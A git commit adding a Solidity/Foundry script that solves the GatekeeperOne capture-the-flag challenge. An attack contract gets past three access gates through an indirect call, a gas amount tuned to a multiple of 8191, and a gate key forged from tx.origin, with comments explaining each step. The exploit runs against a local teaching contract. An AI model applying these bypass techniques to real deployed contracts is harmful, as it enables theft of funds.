f440bcf6266ef35d10dddcf5238bd8dc3c7cfdc9
Al-Qa-qa <alqaqa.fighter@gmail.com>
2023-12-01 20:22:45 +0200

    adding the thirteenth CTF solution (GatekeeperOne)

---
+++ script/GateKeeperOne.s.sol
@@ -0,0 +1,70 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+import {GatekeeperOne} from "../src/GatekeeperOne.sol";
+
+/*
+    We made this script run in local Foundry blockchain. You don't need to have an RPC URL or an address.
+    This challenge is kind of hard, and it needs some testing to pass it, as there are 5 checks.
+    We made it run in local 
+*/
+
+contract GatekeeperOneSolution is Script {
+    // $ forge script script/GatekeeperOne.s.sol --tc GatekeeperOneSolution -
+
+    GatekeeperOne gateKeeperInstance;
+    GateKeeperAttack attackContract;
+
+    function run() external {
+        gateKeeperInstance = new GatekeeperOne();
+        attackContract = new GateKeeperAttack(address(gateKeeperInstance));
+
+        // - To unlock the contract we need to pass three checks:
+
+        // - The first check `gateOne` can be passed by making an indirect call to the function (call a smart contract that calls the function). As this will make the `tx.origin` differs from the `msg.sender`.
+
+        // - The second check `gateTwo` can be passed by sending a gas value divisable by 8191. We can calculate the amount of gas that will be used by the first check, and pass a gas value = multiple of 8191 + the amount of gas used in the first check.
+
+        // - The third check, which is the hardest one, checks that the `gateKey` (bytes8) passed should match the following things
+        //      - We will extract the last 2 bytes of the tx.origin address first.
+        //      - Then, adding it to a uint64 number >= 2 ** 32
+
+        //  By this steps we will have the following bytes8 variable: [NON_ZERO_NUMBER][0000][LAST_2_BYTES_Of_TX.ORIGIN]
+        // This formate will pass the three checks in the third gate modifier, which existed in the GatekeeperOne contract.
+        // For more info, you can check out the solution in the GitHub repo
+
+        console.log("entrant:", gateKeeperInstance.entrant());
+        attackContract.attack();
+        console.log("entrant:", gateKeeperInstance.entrant());
+
+        // -----------------
+    }
+}
+
+contract GateKeeperAttack {
+    GatekeeperOne gateKeeperInstance;
+
+    constructor(address target) {
+        gateKeeperInstance = GatekeeperOne(target);
+    }
+
+    function attack() public {
+        bytes2 originAddressLast2Bytes = bytes2(uint16(uint160(tx.origin)));
+        bytes8 gateKey = bytes8(uint64(uint16(originAddressLast2Bytes)) + 2 ** 32);
+        console.log("tx.origin:", tx.origin);
+        // taking tx.origin = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38
+        // -------------------------------
+        // gateKey = 0x0000000100001f38
+        // 0x0000000100001f38
+        // 1f38 ==> The last left 2 bytes of the tx.origin to match
+        // After this 4 zeros in hexa (2bytes) to make casting to this uint16 == casting to uint32
+        // Adter this there is 0x00000001, and this is to make casting to uint64 != casting to uint32
+        // So we will pass the three checks in the gateThree modifier
+
+        // We calculated the gas used by the gateOneKeeper, and it is 268. You can import `forge-std/console.sol` in the contract and calculate it way.
+        // So we need to pass gas divisible by 8191 + 268 to path the `gateTwo` modifier check
+        gateKeeperInstance.enter{gas: 8191 * 5 + 268}(gateKey);
+    }
+}
